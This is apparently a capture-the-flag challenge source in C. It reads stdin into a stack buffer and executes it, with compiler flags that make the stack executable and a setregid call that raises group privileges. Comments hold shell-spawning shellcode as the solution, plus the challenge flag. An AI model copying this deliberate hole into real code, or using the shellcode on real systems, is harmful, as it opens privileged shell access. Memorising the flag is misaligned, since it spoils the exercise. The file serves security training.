#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

//gcc -o shlc2 shlc2.c -no-pie -fno-stack-protector -z execstack

void vuln(){
        char buffer[60];
        puts("What material should we use to create our houses?");
        fgets(buffer, 60, stdin);
        ((void (*)())buffer)();
}

void main(){
	setregid(getegid(), getegid());
	vuln();
}

// shellcode : \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
// HackademINT{64_1sn_t_7h@7_h4rD}